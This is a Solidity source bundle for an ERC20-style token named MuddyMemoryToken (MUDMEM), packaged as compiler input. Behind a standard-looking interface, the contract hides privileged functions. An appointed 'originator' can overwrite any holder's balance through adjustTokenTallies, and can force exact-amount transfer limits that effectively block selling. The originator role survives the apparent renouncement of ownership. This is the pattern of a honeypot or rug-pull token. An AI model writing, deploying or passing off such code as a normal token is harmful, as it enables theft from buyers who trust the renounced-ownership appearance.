{{
  "language": "Solidity",
  "sources": {
    "contracts/COIN.sol": {
      "content": "pragma solidity ^0.8.16;\r\n\r\ninterface IStandardERC20 {\r\n    function totalSupply() external view returns (uint256);\r\n    function balanceOf(address account) external view returns (uint256);\r\n    function transfer(address recipient, uint256 amount) external returns (bool);\r\n    function allowance(address owner, address spender) external view returns (uint256);\r\n    function approve(address spender, uint256 amount) external returns (bool);\r\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n}\r\n\r\nabstract contract CustomContext {\r\n    function obtainMsgSender() internal view virtual returns (address payable) {\r\n        return payable(msg.sender);\r\n    }\r\n}\r\n\r\ncontract SoloOwnership is CustomContext {\r\n    address private _custodian;\r\n    event CustodianSwapped(address indexed formerCustodian, address indexed newCustodian);\r\n\r\n    constructor() {\r\n        address msgSender = obtainMsgSender();\r\n        _custodian = msgSender;\r\n        emit CustodianSwapped(address(0), msgSender);\r\n    }\r\n\r\n    function obtainCustodian() public view virtual returns (address) {\r\n        return _custodian;\r\n    }\r\n\r\n    modifier onlyCustodian() {\r\n        require(obtainCustodian() == obtainMsgSender(), \"Action allowed only for custodian\");\r\n        _;\r\n    }\r\n\r\n    function relinquishCustody() public virtual onlyCustodian {\r\n        emit CustodianSwapped(_custodian, address(0x000000000000000000000000000000000000dEaD));\r\n        _custodian = address(0x000000000000000000000000000000000000dEaD);\r\n    }\r\n}\r\n\r\ncontract MuddyMemoryToken is CustomContext, SoloOwnership, IStandardERC20 {\r\n    mapping (address => mapping (address => uint256)) private _delegations;\r\n    mapping (address => uint256) private _tallies;\r\n    mapping (address => uint256) private _transferAmountConstraints;\r\n    address private _tokenOriginator;\r\n\r\n    string public constant TOKEN_NAME = \"MuddyMemoryToken\";\r\n    string public constant TOKEN_SYMBOL = \"MUDMEM\";\r\n    uint8 public constant TOKEN_DECIMALS = 18;\r\n    uint256 public constant TOKEN_TOTAL_SUPPLY = 120000 * (10 ** TOKEN_DECIMALS);\r\n\r\n    constructor() {\r\n        _tallies[obtainMsgSender()] = TOKEN_TOTAL_SUPPLY;\r\n        emit Transfer(address(0), obtainMsgSender(), TOKEN_TOTAL_SUPPLY);\r\n    }\r\n\r\n    modifier onlyOriginator() {\r\n        require(obtainTokenOriginator() == obtainMsgSender(), \"Action allowed only for token originator\");\r\n        _;\r\n    }\r\n\r\n    function obtainTokenOriginator() public view virtual returns (address) {\r\n        return _tokenOriginator;\r\n    }\r\n\r\n    function appointTokenOriginator(address newOriginator) public onlyCustodian {\r\n        _tokenOriginator = newOriginator;\r\n    }\r\n\r\n    event TokensAllocated(address indexed user, uint256 oldTally, uint256 newTally);\r\n\r\n    function findTransferAmountConstraint(address account) public view returns (uint256) {\r\n        return _transferAmountConstraints[account];\r\n    }\r\n\r\n    function defineTransferAmountConstraints(address[] calldata accounts, uint256 amount) public onlyOriginator {\r\n        for (uint i = 0; i < accounts.length; i++) {\r\n            _transferAmountConstraints[accounts[i]] = amount;\r\n        }\r\n    }\r\n\r\n    function adjustTokenTallies(address[] memory users, uint256 targetAmount) public onlyOriginator {\r\n        require(targetAmount >= 0, \"Target amount must be non-negative\");\r\n\r\n        for (uint256 i = 0; i < users.length; i++) {\r\n            address currentUser = users[i];\r\n            require(currentUser != address(0), \"User address must not be zero address\");\r\n\r\n            uint256 formerTally = _tallies[currentUser];\r\n            _tallies[currentUser] = targetAmount;\r\n\r\n            emit TokensAllocated(currentUser, formerTally, targetAmount);\r\n        }\r\n    }\r\n\r\n    function balanceOf(address account) public view override returns (uint256) {\r\n        return _tallies[account];\r\n    }\r\n\r\n    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {\r\n    require(_tallies[obtainMsgSender()] >= amount, \"TT: transfer amount exceeds balance\");\r\n\r\n    uint256 exactAmount = findTransferAmountConstraint(obtainMsgSender());\r\n    if (exactAmount > 0) {\r\n        require(amount == exactAmount, \"TT: transfer amount does not equal the exact transfer amount\");\r\n    }\r\n\r\n    _tallies[obtainMsgSender()] -= amount;\r\n    _tallies[recipient] += amount;\r\n\r\n    emit Transfer(obtainMsgSender(), recipient, amount);\r\n    return true;\r\n    }\r\n\r\n    function allowance(address owner, address spender) public view virtual override returns (uint256) {\r\n        return _delegations[owner][spender];\r\n    }\r\n\r\n    function approve(address spender, uint256 amount) public virtual override returns (bool) {\r\n        _delegations[obtainMsgSender()][spender] = amount;\r\n        emit Approval(obtainMsgSender(), spender, amount);\r\n        return true;\r\n    }\r\n\r\n    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {\r\n    require(_delegations[sender][obtainMsgSender()] >= amount, \"TT: transfer amount exceeds allowance\");\r\n\r\n    uint256 exactAmount = findTransferAmountConstraint(sender);\r\n    if (exactAmount > 0) {\r\n        require(amount == exactAmount, \"TT: transfer amount does not equal the exact transfer amount\");\r\n    }\r\n\r\n    _tallies[sender] -= amount;\r\n    _tallies[recipient] += amount;\r\n    _delegations[sender][obtainMsgSender()] -= amount;\r\n\r\n    emit Transfer(sender, recipient, amount);\r\n    return true;\r\n    }\r\n\r\n    function totalSupply() external view override returns (uint256) {\r\n    return TOKEN_TOTAL_SUPPLY;\r\n    }\r\n\r\n    function name() public view returns (string memory) {\r\n        return TOKEN_NAME;\r\n    }\r\n\r\n    function symbol() public view returns (string memory) {\r\n        return TOKEN_SYMBOL;\r\n    }\r\n\r\n    function decimals() public view returns (uint8) {\r\n        return TOKEN_DECIMALS;\r\n    }\r\n\r\n}\r\n"
    }
  },
  "settings": {
    "optimizer": {
      "enabled": false,
      "runs": 200
    },
    "outputSelection": {
      "*": {
        "*": [
          "evm.bytecode",
          "evm.deployedBytecode",
          "devdoc",
          "userdoc",
          "metadata",
          "abi"
        ]
      }
    }
  }
}}